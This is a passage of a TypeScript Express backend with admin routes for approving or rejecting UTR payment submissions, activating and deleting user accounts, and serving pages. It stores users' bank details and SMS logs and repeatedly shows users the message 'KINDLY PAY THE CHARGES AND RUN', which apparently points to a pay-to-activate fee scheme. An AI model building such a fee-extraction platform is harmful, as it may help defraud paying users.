    }

    const isUpgrade199 = Boolean(
      (utrItem && (Number(utrItem.amount) === 199 || String(utrItem.type || '').includes('199') || String(utrItem.type || '').toLowerCase().includes('upgrade'))) ||
        (utrRecord && (Number(utrRecord.amount) === 199 || String(utrRecord.type || '').includes('199')))
    );
    const nextStatus = isUpgrade199 ? '✓ Approved & Receipt Generated' : '✓ Approved & Activated';
    if (utrItem) {
      utrItem.status = nextStatus;
    }

    const targetUser = String(username || utrItem?.username || '').trim();
    if (targetUser && targetUser !== 'demo') {
      const userObj = ensureUserRecord(targetUser);
      userObj.activated = true;
      userObj.activationStatus = 'approved';
      userObj.rejectionMessage = '';
      pushActivityLog(targetUser, 'activation', `Admin approved UTR (${utrItem?.utr || utrId}) and activated account for @${targetUser}`, 'activation', 'success');
    }

    saveDatabase(db);
    broadcastServerEvent('admin_approve_utr', { username: targetUser, utrId });

    return res.json({ success: true, message: 'UTR Approved and user account activated!' });
  });

  app.post('/api/admin/utr/reject', (req: Request, res: Response) => {
    if (!isAdminTokenValid(req)) {
      return res.status(401).json({ success: false, message: 'Admin authentication required.' });
    }

    const { utrId, username, utrRecord } = req.body || {};
    let utrItem = db.utrs.find((u) => u.id === utrId || u.utr === utrId);
    if (!utrItem && utrRecord && utrRecord.id) {
      utrItem = {
        id: String(utrRecord.id),
        username: String(utrRecord.username || username || ''),
        type: String(utrRecord.type || 'UTR Submission'),
        amount: Number(utrRecord.amount || 0),
        utr: String(utrRecord.utr || ''),
        tokenNumber: String(utrRecord.tokenNumber || utrRecord.utr || ''),
        status: '❌ Rejected (Invalid UTR)',
        bank: utrRecord.bank,
        ifsc: utrRecord.ifsc,
        accNumber: utrRecord.accNumber,
        contact: utrRecord.contact,
        timestamp: String(utrRecord.timestamp || new Date().toISOString()),
      };
      db.utrs.unshift(utrItem);
    }
    if (utrItem) {
      utrItem.status = '❌ Rejected (Invalid UTR)';
    }

    const targetUser = String(username || utrItem?.username || '').trim();
    if (targetUser && targetUser !== 'demo') {
      const userObj = ensureUserRecord(targetUser);
      userObj.activated = false;
      userObj.activationStatus = 'rejected';
      userObj.rejectionMessage = 'ADMIN REJECTED YOUR PAYMENT. KINDLY PAY THE CHARGES AND RUN.';
    }
    pushActivityLog(targetUser || 'User', 'withdrawal', `Admin rejected submitted UTR (${utrItem?.utr || utrId}) for @${targetUser || 'User'}`, 'security', 'warning');
    saveDatabase(db);
    broadcastServerEvent('admin_reject_utr', { username: targetUser, utrId });

    return res.json({ success: true, message: 'UTR marked as rejected.' });
  });

  app.post('/api/admin/approve-user', (req: Request, res: Response) => {
    if (!isAdminTokenValid(req)) {
      return res.status(401).json({ success: false, message: 'Admin authentication required.' });
    }
    const { username } = req.body || {};
    const uname = String(username || '').trim();
    if (!uname || uname === 'demo') {
      return res.status(400).json({ success: false, message: 'Valid username required' });
    }
    const userObj = ensureUserRecord(uname);
    userObj.activated = true;
    userObj.activationStatus = 'approved';
    userObj.rejectionMessage = '';
    pushActivityLog(uname, 'activation', `Admin approved panel for @${uname}`, 'activation', 'success');
    saveDatabase(db);
    broadcastServerEvent('admin_approve_user', { username: uname });
    return res.json({ success: true, user: userObj });
  });

  app.post('/api/admin/reject-user', (req: Request, res: Response) => {
    if (!isAdminTokenValid(req)) {
      return res.status(401).json({ success: false, message: 'Admin authentication required.' });
    }
    const { username } = req.body || {};
    const uname = String(username || '').trim();
    if (!uname || uname === 'demo') {
      return res.status(400).json({ success: false, message: 'Valid username required' });
    }
    const msg = 'ADMIN REJECTED YOUR PAYMENT. KINDLY PAY THE CHARGES AND RUN.';
    const userObj = ensureUserRecord(uname);
    userObj.activated = false;
    userObj.activationStatus = 'rejected';
    userObj.rejectionMessage = msg;
    pushActivityLog(uname, 'withdrawal', `Admin rejected payment for @${uname}`, 'security', 'warning');
    saveDatabase(db);
    broadcastServerEvent('admin_reject_user', { username: uname });
    return res.json({ success: true, user: userObj });
  });

  app.post('/api/admin/toggle-user', (req: Request, res: Response) => {
    if (!isAdminTokenValid(req)) {
      return res.status(401).json({ success: false, message: 'Admin authentication required.' });
    }

    const { username } = req.body || {};
    const uname = String(username || '').trim();
    if (!uname || !db.users[uname]) {
      return res.status(404).json({ success: false, message: 'User not found' });
    }

    const next = !db.users[uname].activated;
    db.users[uname].activated = next;
    db.users[uname].activationStatus = next ? 'approved' : 'rejected';
    db.users[uname].rejectionMessage = next ? '' : 'ADMIN REJECTED YOUR PAYMENT. KINDLY PAY THE CHARGES AND RUN.';
    pushActivityLog(
      uname,
      'activation',
      `Admin toggled account status to ${next ? 'ACTIVE' : 'REJECTED'} for @${uname}`,
      'activation',
      'info'
    );
    saveDatabase(db);
    broadcastServerEvent('admin_toggle_user', { username: uname });

    return res.json({ success: true, user: db.users[uname] });
  });

  app.post('/api/admin/delete-user', (req: Request, res: Response) => {
    if (!isAdminTokenValid(req)) {
      return res.status(401).json({ success: false, message: 'Admin authentication required.' });
    }

    const { username } = req.body || {};
    if (!username || !db.users[username]) {
      return res.status(404).json({ success: false, message: 'User not found' });
    }

    delete db.users[username];
    db.utrs = db.utrs.filter((u) => u.username !== username);
    db.activityLogs = db.activityLogs.filter((l) => l.username !== username);
    db.smsLogs = db.smsLogs.filter((s) => s.username !== username);
    saveDatabase(db);
    broadcastServerEvent('admin_delete_user', { username });

    return res.json({ success: true, message: `Deleted user @${username}` });
  });

  app.post('/api/admin/clear-logs', (req: Request, res: Response) => {
    if (!isAdminTokenValid(req)) {
      return res.status(401).json({ success: false, message: 'Admin authentication required.' });
    }
    db.activityLogs = [];
    saveDatabase(db);
    broadcastServerEvent('admin_clear_logs');
    return res.json({ success: true });
  });

  // ----------------------------------------
  // 5. VITE MIDDLEWARE (DEV & MULTI-PAGE SERVING)
  // ----------------------------------------
  if (process.env.NODE_ENV === 'production') {
    app.use('/admin/assets', express.static(path.resolve(__dirname, 'dist', 'assets')));
    app.use(express.static(path.resolve(__dirname, 'dist')));
    app.get(['/admin', '/admin/', '/admin/index.html', '/admin.html'], (_req: Request, res: Response) => {
      res.sendFile(path.resolve(__dirname, 'dist', 'admin', 'index.html'));
    });
    app.get(['/dashboard', '/dashboard.html'], (_req: Request, res: Response) => {
      res.sendFile(path.resolve(__dirname, 'dist', 'dashboard.html'));
    });
    app.get('*', (_req: Request, res: Response) => {
      res.sendFile(path.resolve(__dirname, 'dist', 'index.html'));
    });
  } else {
    app.use(express.static(path.resolve(__dirname, 'public')));
    app.get(['/admin', '/admin.html'], (req: Request, res: Response, next) => {
      if (req.path === '/admin/') return next();
      res.redirect(302, '/admin/');
    });
    app.get('/dashboard', (req: Request, res: Response, next) => {
      if (req.path === '/dashboard/') return next();
      res.redirect(302, '/dashboard.html');
    });
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'mpa',
    });
    app.use(vite.middlewares);
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Backend server running on http://0.0.0.0:${PORT}`);
  });
}

startServer();
